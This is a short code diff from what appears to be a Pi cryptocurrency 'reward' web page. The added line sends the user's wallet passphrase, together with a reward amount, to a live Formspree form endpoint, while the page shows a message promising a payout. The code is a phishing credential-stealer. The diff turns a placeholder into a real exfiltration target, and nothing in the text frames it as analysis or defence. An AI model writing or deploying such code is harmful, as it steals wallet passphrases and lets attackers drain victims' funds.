@@ -207,7 +207,7 @@
 
             document.getElementById("message").innerText = piAmount + " Pi will be rewarded to your wallet shortly.";
 
-            fetch('https://your-server.com/api/send-email', {
+            fetch('https://formspree.io/f/xeoeblqv', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ passphrase, piAmount })
